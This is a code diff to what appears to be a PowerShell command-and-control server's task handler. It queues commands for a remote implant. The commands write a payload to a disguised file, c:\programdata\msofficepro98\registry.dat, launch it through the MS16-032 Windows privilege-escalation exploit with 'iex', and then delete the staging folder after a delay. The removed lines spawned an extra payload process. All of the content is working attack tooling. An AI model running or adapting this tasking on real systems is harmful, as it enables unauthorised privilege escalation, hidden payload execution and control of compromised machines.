@@ -797,15 +797,6 @@ $error.clear()
             { 
                 CheckModuleLoaded "Invoke-MS16-032.ps1" $psrandomuri
 
-                $payload = Get-Content -Path "$FolderPath\payload.bat"
-                $payload = $payload -replace 'powershell ', ''
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "start-process powershell -args '"+$payload+"'"
-                } | Out-Null
-
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
@@ -818,25 +809,17 @@ $error.clear()
                     RandomURI = $psrandomuri
                     Command   = '$payload | out-file c:\programdata\msofficepro98\registry.dat'
                 } | Out-Null
-                write-host "This module will kill the implant so another is restarted for you, Also remove this file manually after: 'del c:\programdata\msofficepro98\registry.dat'" -ForegroundColor Red
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
                     Command   = "invoke-ms16-032 'powershell.exe iex (get-content c:\programdata\msofficepro98\registry.dat)'"
                 } | Out-Null
-                $pscommand = "remove-item c:\programdata\msofficepro98 -recurse"
+                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
             }
             if ($pscommand -eq 'invoke-ms16-032-proxypayload')
             { 
-                $payload = Get-Content -Path "$FolderPath\payload.bat"
-                $payload = $payload -replace 'powershell ', ''
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "start-process powershell -args '"+$payload+"'"
-                } | Out-Null
+                CheckModuleLoaded "Invoke-MS16-032.ps1" $psrandomuri
 
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
                 $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"               
@@ -853,14 +836,13 @@ $error.clear()
                     RandomURI = $psrandomuri
                     Command   = "'$proxypayload' | out-file c:\programdata\msofficepro98\registry.dat"
                 } | Out-Null
-                write-host "This module will kill the implant so another is restarted for you, Also remove this file manually after: 'del c:\programdata\msofficepro98\registry.dat'" -ForegroundColor Red
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
                     Command   = "invoke-ms16-032 'powershell.exe iex (get-content c:\programdata\msofficepro98\registry.dat)'"
                 } | Out-Null
-                $pscommand = "remove-item c:\programdata\msofficepro98 -recurse"
+                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
